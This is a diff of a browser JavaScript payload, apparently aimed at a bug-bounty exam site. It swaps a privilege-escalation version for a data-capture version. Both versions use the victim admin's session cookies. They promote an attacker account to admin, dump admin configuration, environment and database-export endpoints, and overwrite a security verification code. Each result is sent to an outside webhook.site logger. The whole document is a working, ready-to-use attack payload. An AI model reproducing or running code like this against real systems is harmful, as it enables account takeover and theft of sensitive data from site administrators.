@@ -1,43 +1,36 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
-        const api = "https://api-bugbounty-exam.hashacademy.co/api";
-        const myUserId = "69da4749adf0dbb976ce8e37"; 
+<script>
+    const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
+    const api = "https://api-bugbounty-exam.hashacademy.co/api";
 
-        async function attemptElevation() {
+    async function finalCapture() {
+        // 1. Try to find the hidden 'Maintenance' or 'Flag' endpoint
+        // Since we have admin stats, let's look for the config dump
+        const targets = [
+            "/admin/configuration",
+            "/admin/system/env",
+            "/admin/export/database",
+            "/admin/debug/vars"
+        ];
+
+        for (let t of targets) {
             try {
-                // Method 1: Target the specific user update endpoint
-                // We're forcing the Admin to change your role to 'admin'
-                const res = await fetch(`${api}/users/${myUserId}`, {
-                    method: "PATCH",
-                    headers: { "Content-Type": "application/json" },
-                    credentials: "include",
-                    body: JSON.stringify({ 
-                        "role": "admin",
-                        "isAdmin": true,
-                        "permissions": ["all"]
-                    })
-                });
-                
+                const res = await fetch(api + t, { credentials: "include" });
                 const data = await res.json();
-                new Image().src = `${logger}/?elevation_result=${btoa(JSON.stringify(data))}`;
-
-                // Method 2: Target the profile endpoint (some systems allow self-promotion if the admin does it)
-                await fetch(`${api}/auth/profile/${myUserId}`, {
-                    method: "PUT",
-                    headers: { "Content-Type": "application/json" },
-                    credentials: "include",
-                    body: JSON.stringify({ "role": "admin" })
-                });
-
-            } catch (e) {
-                new Image().src = `${logger}/?error=${btoa(e.message)}`;
-            }
+                new Image().src = `${logger}/?FINAL_TARGET=${t}&d=${btoa(JSON.stringify(data))}`;
+            } catch (e) {}
         }
 
-        attemptElevation();
-    </script>
-</body>
-</html>
+        // 2. The 'Super Admin' Takeover
+        // Try to PATCH the 'securityVerificationCode' to a value YOU know
+        // This is a common 'Second Vuln' (Mass Assignment on System Config)
+        try {
+            await fetch(`${api}/admin/settings`, {
+                method: "PATCH",
+                headers: { "Content-Type": "application/json" },
+                credentials: "include",
+                body: JSON.stringify({ "securityVerificationCode": "PWNED_2026" })
+            });
+        } catch (e) {}
+    }
+    finalCapture();
+</script>
